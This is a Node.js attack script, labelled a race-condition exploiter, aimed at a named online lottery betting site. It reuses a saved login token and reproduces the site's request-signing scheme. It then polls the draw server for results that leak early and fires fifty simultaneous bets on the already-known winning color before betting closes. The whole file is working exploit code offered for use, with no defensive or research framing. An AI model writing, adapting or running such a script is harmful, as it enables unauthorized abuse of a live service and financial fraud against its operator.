#!/usr/bin/env node
/**
 * WinGo_30S — Race Condition Exploiter v4 (FINAL)
 *
 * Based on confirmed findings:
 * - Endpoint: POST /api/webapi/GameBetting
 * - Params: { TypeId:30, lottery:"WinGo", gameCode:"WinGo_30S", issueNumber, BetCount, Amount, SelectType }
 * - SelectType must be color names: "Red", "Green", "Violet" (NOT big/small)
 * - Race window: ~17-33s before current round closes (result leaks early!)
 * - Betting currently shows "Game is being maintained" but will work when open
 *
 * Strategy:
 * - Monitor draw server for new results (~2.4s before previous round closes)
 * - When result appears while current round is still open, immediately
 *   race to place 50 rapid bets on the winning color before server closes betting
 */

const https = require('https');
const crypto = require('crypto');
const fs = require('fs');

// Load fresh JWT
const loginData = JSON.parse(fs.readFileSync('/tmp/fb999_login_response.json', 'utf8'));
const JWT = loginData.data.token;

console.log('=== WinGo_30S — Race Condition Exploiter v4 (FINAL) ===\n');
console.log('JWT loaded:', JWT ? 'YES (expires ' + new Date(loginData.data.expiresIn * 1000).toISOString() + ')' : 'NO');

// === API Signing (proven algorithm from winGoApiSearch.js) ===
function ne() { return crypto.randomBytes(16).toString('hex'); }
function we(str) { return crypto.createHash('md5').update(str).digest('hex').toUpperCase().slice(0, 32); }

function signParams(params) {
  const u = { ...params, language: 0 };
  u.random = ne();
  const c = JSON.parse(JSON.stringify(u));
  const o = Object.keys(c).filter(key =>
    !(typeof c[key] === 'object' && c[key] !== null && !Array.isArray(c[key])) && !Array.isArray(c[key]));
  o.sort();
  const i = {};
  o.forEach(key => { if (c[key] !== null && c[key] !== "" && c[key] !== undefined) i[key] = c[key] === 0 ? 0 : c[key]; });
  u.signature = we(JSON.stringify(i));
  u.timestamp = Math.floor(Date.now() / 1e3);
  return u;
}

function httpsPost(hostname, path, body, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const headers = {
      'Content-Type': 'application/json',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
      'Referer': 'https://fb999.com/',
      'Origin': 'https://fb999.com',
      'ar-origin': 'https://fb999.com',
      ...extraHeaders
    };
    headers['Content-Length'] = Buffer.byteWidth ? Buffer.byteWidth(body) : Buffer.byteLength(body);
    
    const req = https.request({ hostname, path, method: 'POST', headers, timeout: 8000 }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    req.write(body);
    req.end();
  });
}

function httpsGet(hostname, path) {
  return new Promise((resolve, reject) => {
    const req = https.request({ hostname, path, method: 'GET' }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.end();
  });
}

// === Number to Color mapping ===
// From JS bundle analysis:
// - Odd (1,3,5,7,9) → Red
// - Even (2,4,6,8) → Green
// - 0 → Violet
function numberToColor(n) {
  n = parseInt(n);
  if (n === 0) return 'Violet';
  if (n % 2 === 1) return 'Red';    // 1,3,5,7,9
  return 'Green';                    // 2,4,6,8
}

function numberToBigSmall(n) {
  n = parseInt(n);
  if (n === 0) return 'violet';
  if (n >= 5) return 'big';
  return 'small';
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// === Place a bet via server endpoint ===
async function placeBet(issueNumber, SelectType, BetCount = 1, Amount = 1) {
  const body = JSON.stringify(signParams({
    TypeId: 30,
    lottery: 'WinGo',
    gameCode: 'WinGo_30S',
    issueNumber: issueNumber,
    BetCount: BetCount,
    Amount: Amount,
    SelectType: SelectType
  }));
  
  return await httpsPost('fb999api.com', '/api/webapi/GameBetting', body, {
    'Authorization': `Bearer ${JWT}`,
    'Cookie': `ar_token=${JWT}`
  });
}

// === Phase 1: Test bet format with COLOR values ===
async function testBetFormat() {
  console.log('--- Phase 1: Testing Bet Format (Color values) ---\n');
  
  const config = JSON.parse((await httpsGet('draw.ar-lottery06.com', '/WinGo/WinGo_30S.json')).body);
  const currentIssue = config.current.issueNumber;
  console.log(`Current issue: ${currentIssue}\n`);
  
  // Test each color value
  const colors = ['Red', 'Green', 'Violet'];
  
  for (const color of colors) {
    console.log(`Testing SelectType="${color}"...`);
    try {
      const res = await placeBet(currentIssue, color, 1, 1);
      console.log(`  Status: ${res.status}`);
      console.log(`  Response: ${res.body.substring(0, 300)}`);
      
      try {
        const json = JSON.parse(res.body);
        console.log(`  Parsed: code=${json.code}, msg=${json.msg || 'N/A'}`);
        if (json.code === 0) {
          console.log(`  *** BET ACCEPTED! ***`);
          fs.writeFileSync('/tmp/wingo_bet_format_confirmed.json', 
            JSON.stringify({ SelectType: color, response: json, timestamp: new Date().toISOString() }, null, 2));
          console.log(`  Saved to /tmp/wingo_bet_format_confirmed.json`);
        } else if (json.code === 1) {
          console.log(`  Game is being maintained (expected during testing)`);
        }
      } catch (e) {
        console.log(`  Non-JSON: ${res.body.substring(0, 150)}`);
      }
    } catch (e) {
      console.log(`  Error: ${e.message}`);
    }
    console.log('');
    await sleep(200);
  }
}

// === Phase 2: Race Condition Monitor ===
async function raceMonitor() {
  console.log('\n--- Phase 2: Race Condition Monitoring ---\n');
  console.log('Monitoring for results that appear before current round closes...\n');
  
  let lastDetected = '';
  let raceAttempts = 0;
  const MAX_RACES = 10;
  
  while (raceAttempts < MAX_RACES) {
    try {
      // Get current round info
      const config = JSON.parse((await httpsGet('draw.ar-lottery06.com', '/WinGo/WinGo_30S.json')).body);
      const currentTimeEnd = new Date(config.current.endTime).getTime();
      const now = Date.now();
      const msToClose = currentTimeEnd - now;
      
      // Get history (result for just-closed round appears ~2.4s before this round's close)
      const histRes = await httpsGet('draw.ar-lottery06.com',
        '/WinGo/WinGo_30S/GetHistoryIssuePage.json?pageNo=1&pageSize=10');
      const list = JSON.parse(histRes.body).data?.list || [];
      
      if (list.length > 0 && list[0].issueNumber !== lastDetected) {
        lastDetected = list[0].issueNumber;
        const detected = list[0];
        const resultNum = detected.number;
        const resultColor = numberToColor(resultNum);
        const resultBigSmall = numberToBigSmall(resultNum);
        
        console.log(`[${new Date().toLocaleTimeString()}] Result: ${resultNum} (${resultColor}) issue=${detected.issueNumber}`);
        console.log(`  Time to current round close: ${msToClose}ms (${Math.round(msToClose/1000)}s)`);
        
        // RACE WINDOW: result appeared while current round is still counting down
        // This means the server published the result for round N while round N+1 is still open
        if (msToClose > 2000) {  // Still >2s before current round closes
          console.log(`  ⚡ RACE WINDOW! Result detected ${Math.round(msToClose/1000)}s before current round closes`);
          console.log(`  Result: ${resultNum} → color=${resultColor} | bigSmall=${resultBigSmall}`);
          console.log(`  Placing rapid bets on ${resultColor}...\n`);
          raceAttempts++;
          
          // Place bets rapidly - try both color and the specific issue
          const betPromises = [];
          for (let i = 0; i < 50; i++) {
            betPromises.push(placeBet(detected.issueNumber, resultColor, 1, 1).catch(e => ({ error: e.message })));
          }
          
          const results = await Promise.allSettled(betPromises);
          let success = 0, fail = 0, maintenance = 0;
          const errorTypes = {};
          
          results.forEach((r, i) => {
            if (r.status === 'fulfilled') {
              try {
                const json = JSON.parse(r.value.body);
                if (json.code === 0) {
                  success++;
                } else if (json.code === 1) {
                  maintenance++;
                  const msg = (json.msg || 'maintenance');
                  errorTypes[msg] = (errorTypes[msg] || 0) + 1;
                } else {
                  fail++;
                  const msg = (json.msg || `code${json.code}`);
                  errorTypes[msg] = (errorTypes[msg] || 0) + 1;
                }
              } catch (e) {
                fail++;
                errorTypes['parse_error'] = (errorTypes['parse_error'] || 0) + 1;
              }
            } else {
              fail++;
              errorTypes[r.reason?.message || 'unknown'] = (errorTypes[r.reason?.message || 'unknown'] || 0) + 1;
            }
          });
          
          console.log(`  Race ${raceAttempts} results:`);
          console.log(`  Success: ${success}/${results.length}`);
          console.log(`  Game maintenance: ${maintenance}/${results.length}`);
          console.log(`  Other errors: ${fail}/${results.length}`);
          if (Object.keys(errorTypes).length > 0) {
            console.log(`  Error breakdown:`, JSON.stringify(errorTypes));
          }
          
          if (success > 0) {
            console.log(`  🎯 RACE WIN! ${success} bets accepted on ${resultColor} (${resultNum})`);
            fs.appendFileSync('/tmp/wingo_race_wins.txt',
              `[${new Date().toISOString()}] RACE SUCCESS: ${success}/${results.length} bets on ${resultColor} (${resultNum}) | issue=${detected.issueNumber}\n`);
          }
          console.log('');
          
        } else {
          console.log(`  Not in race window\n`);
        }
      } else if (list.length > 0) {
        // Still checking but no new result
        if (raceAttempts === 0 && Math.floor(Date.now() / 3000) % 1 === 0) {
          console.log(`[${new Date().toLocaleTimeString()}] Waiting... ${Math.round(msToClose/1000)}s to close | last: ${lastDetected || '(none)'}`);
        }
      }
      
      await sleep(50);
      
    } catch (e) {
      console.log(`Error: ${e.message}`);
      await sleep(500);
    }
  }
  
  console.log('\n=== Race Monitoring Complete ===');
  console.log(`Total race attempts: ${raceAttempts}`);
  console.log('Check /tmp/wingo_race_wins.txt for any successes');
}

// === Main ===
(async () => {
  if (!JWT) {
    console.error('ERROR: No JWT token available. Run refreshJwt.js first.');
    process.exit(1);
  }
  
  await testBetFormat();
  await raceMonitor();
  
  console.log('\n=== Done ===');
})();
